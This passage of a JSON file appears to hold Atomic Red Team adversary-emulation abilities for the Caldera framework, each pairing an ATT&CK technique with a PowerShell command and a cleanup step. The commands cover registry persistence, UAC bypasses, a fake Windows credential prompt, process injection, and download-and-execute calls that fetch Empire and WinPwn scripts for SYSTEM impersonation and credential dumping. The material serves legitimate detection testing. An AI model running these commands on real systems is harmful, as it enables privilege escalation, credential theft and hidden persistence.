                    "command": "net stop w32time; Copy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "23daed0787180c7f2ffbc20528570749",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "23daed0787180c7f2ffbc20528570749"
    },
    "T1546.013__multiple__Event Triggered Execution: PowerShell Profile__49a7502f9c667aa3af9c87f6ab1e68b3": {
        "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.013",
            "name": "Event Triggered Execution: PowerShell Profile"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$oldprofile = cat $profile | Select-Object -skiplast 1; Set-Content $profile -Value $oldprofile",
                    "command": "Add-Content $profile -Value \"\"; Add-Content $profile -Value \"Start-Process calc.exe\"; powershell -Command exit",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "49a7502f9c667aa3af9c87f6ab1e68b3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "49a7502f9c667aa3af9c87f6ab1e68b3"
    },
    "T1547.001__multiple__Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder__34dfc0264e6fd27b4997fea21c0bbada": {
        "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"; Remove-Item \"$env:TMP\\atomictest\\\" -Recurse -Force",
                    "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "34dfc0264e6fd27b4997fea21c0bbada",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "34dfc0264e6fd27b4997fea21c0bbada"
    },
    "T1134.001__multiple__Access Token Manipulation: Token Impersonation/Theft__d1bde9af5206152c9980a5b6adcc1813": {
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d1bde9af5206152c9980a5b6adcc1813",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d1bde9af5206152c9980a5b6adcc1813"
    },
    "T1133__multiple__External Remote Services__ff4e1ea516f781a6ef93323ba9dfac0a": {
        "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1133",
            "name": "External Remote Services"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {; Remove-Item -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -ErrorAction Ignore}",
                    "command": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {;   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force;   New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name \"chrome\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ff4e1ea516f781a6ef93323ba9dfac0a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ff4e1ea516f781a6ef93323ba9dfac0a"
    },
    "T1056.002__multiple__Input Capture: GUI Input Capture__6f5096d87a8f9ac4c397215cb58cc978": {
        "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1056.002",
            "name": "Input Capture: GUI Input Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6f5096d87a8f9ac4c397215cb58cc978",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6f5096d87a8f9ac4c397215cb58cc978"
    },
    "T1078.003__multiple__Valid Accounts: Local Accounts__fe3527480a77ab0b52a518654e120b72": {
        "description": "Loot local Credentials - Safetykatz technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.003",
            "name": "Valid Accounts: Local Accounts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); safedump -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fe3527480a77ab0b52a518654e120b72",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "fe3527480a77ab0b52a518654e120b72"
    },
    "T1546.011__multiple__Event Triggered Execution: Application Shimming__ed65658e4431bc3b636dd0de29bf8e35": {
        "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.011",
            "name": "Event Triggered Execution: Application Shimming"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore; Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore",
                    "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"; New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ed65658e4431bc3b636dd0de29bf8e35",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ed65658e4431bc3b636dd0de29bf8e35"
    },
    "T1547.005__multiple__Boot or Logon Autostart Execution: Security Support Provider__cc5347b500dfbdbb96b1fdb6a0669708": {
        "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.005",
            "name": "Boot or Logon Autostart Execution: Security Support Provider"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old'); Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value \"$oldvalue\"; Remove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old'; ",
                    "command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'); Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\"; $newvalue = \"AtomicTest.dll\"; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cc5347b500dfbdbb96b1fdb6a0669708",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cc5347b500dfbdbb96b1fdb6a0669708"
    },
    "T1547.004__multiple__Boot or Logon Autostart Execution: Winlogon Helper DLL__7cd5d1852fb4a534fa9b735288ca158f": {
        "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore",
                    "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7cd5d1852fb4a534fa9b735288ca158f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7cd5d1852fb4a534fa9b735288ca158f"
    },
    "T1574.012__multiple__Hijack Execution Flow: COR_PROFILER__7179bb4957f1f7f3004ea70c714a8fb9": {
        "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.012",
            "name": "Hijack Execution Flow: COR_PROFILER"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$env:COR_ENABLE_PROFILING = 0; $env:COR_PROFILER = ''; $env:COR_PROFILER_PATH = ''",
                    "command": "$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH = '\"83f016_T1574.012x64.dll\"'; POWERSHELL -c 'Start-Sleep 1'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "83f016_T1574.012x64.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "7179bb4957f1f7f3004ea70c714a8fb9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7179bb4957f1f7f3004ea70c714a8fb9"
    },
    "T1556.002__multiple__Modify Authentication Process: Password Filter DLL__cc7f0eb8b9115b271eaaa42c9b6f3dca": {
        "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1556.002",
            "name": "Modify Authentication Process: Password Filter DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg.exe import \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"; remove-item C:\\Windows\\System32\\AtomicRedTeamPWFilter.dll",
                    "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"; $passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename; $lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"; $notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\"); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cc7f0eb8b9115b271eaaa42c9b6f3dca",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cc7f0eb8b9115b271eaaa42c9b6f3dca"
    },
    "T1055.011__multiple__Process Injection: Extra Window Memory Injection__a8a3487e477e0c1501ceb0239b5cad15": {
        "description": "Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.011",
            "name": "Process Injection: Extra Window Memory Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
                    "command": "4a3cbc_T1055.011_x64.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "4a3cbc_T1055.011_x64.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "a8a3487e477e0c1501ceb0239b5cad15",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a8a3487e477e0c1501ceb0239b5cad15"
    },
    "T1078.004__multiple__Valid Accounts: Cloud Accounts__987057c2b2cf415214afef9ea59378e5": {
        "description": "Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure\nAutomation runbook to execute malicious code and maintain persistence in their target's environment.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.004",
            "name": "Valid Accounts: Cloud Accounts"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Remove-AzAutomationRunbook -AutomationAccountName; cd \"$PathToAtomicsFolder/T1078.004/src/T1078.004-2/\"; terraform destroy -auto-approve",
                    "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd; Connect-AzAccount -Credential $creds; New-AzAutomationRunbook -Name",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "987057c2b2cf415214afef9ea59378e5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "987057c2b2cf415214afef9ea59378e5"
    },
    "T1055__multiple__Process Injection__4abdd4cce7c4aa8a3804a6f5ff365514": {
        "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055",
            "name": "Process Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process $notepad.pid",
                    "command": "$notepad = Start-Process notepad -passthru; Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4abdd4cce7c4aa8a3804a6f5ff365514",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4abdd4cce7c4aa8a3804a6f5ff365514"
    },
    "T1055.012__multiple__Process Injection: Process Hollowing__557321faaf98c77b2b452cecd7b1de37": {
        "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.012",
            "name": "Process Injection: Process Hollowing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "557321faaf98c77b2b452cecd7b1de37",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "557321faaf98c77b2b452cecd7b1de37"
    },
    "T1546.008__multiple__Event Triggered Execution: Accessibility Features__4bdc05fe2f0006f86575053dc740edf3": {
        "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.008",
            "name": "Event Triggered Execution: Accessibility Features"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\"); Foreach ($item in $input_table); {;   $item = $item.trim();   reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null; }",
                    "command": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\"); $Name = \"Debugger\"; $Value = \"C:\\windows\\system32\\cmd.exe\"; Foreach ($item in $input_table){;   $item = $item.trim();   $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\";   IF(!(Test-Path $registryPath));   {;     New-Item -Path $registryPath -Force;     New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force;   };   ELSE;   {;     New-ItemProperty -Path $registryPath -Name $name -Value $Value;   }; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4bdc05fe2f0006f86575053dc740edf3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4bdc05fe2f0006f86575053dc740edf3"
    },
    "T1547.012__multiple__Boot or Logon Autostart Execution: Print Processors__b2725f4e411b9328aa73fe54501a7564": {
        "description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.012",
            "name": "Boot or Logon Autostart Execution: Print Processors"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "net stop spooler; rm -force C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll -ErrorAction SilentlyContinue; rm -force C:\\Users\\Public\\AtomicTest.txt -ErrorAction SilentlyContinue; remove-item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" -Force -ErrorAction SilentlyContinue; net start spooler",
                    "command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}; net stop spooler; Copy-Item \"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll; reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f; net start spooler; if(0){;   Restart-Computer; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b2725f4e411b9328aa73fe54501a7564",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b2725f4e411b9328aa73fe54501a7564"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__20d68348c822d2947e5a795ac15a22b0": {
        "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\fodhelper.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "20d68348c822d2947e5a795ac15a22b0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "20d68348c822d2947e5a795ac15a22b0"
    },
    "T1056.004__multiple__Input Capture: Credential API Hooking__2b0df0cb121fb7ebe7ac0eed9e14b785": {
        "description": "Hooks functions in PowerShell to read TLS Communications\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1056.004",
            "name": "Input Capture: Credential API Hooking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"; Invoke-WebRequest",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2b0df0cb121fb7ebe7ac0eed9e14b785",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2b0df0cb121fb7ebe7ac0eed9e14b785"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__1bb96a80fd7968839ead470953ffb738": {
        "description": "UAC bypass using ccmstp technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1bb96a80fd7968839ead470953ffb738",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1bb96a80fd7968839ead470953ffb738"
    },
    "T1484.001__multiple__Domain Policy Modification: Group Policy Modification__5e0427f03faf554046c6a29864087b49": {
        "description": "An adversary modifies group policy settings\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1484.001",
            "name": "Domain Policy Modification: Group Policy Modification"
        },
        "platforms": {
            "windows": {
                "psh": {
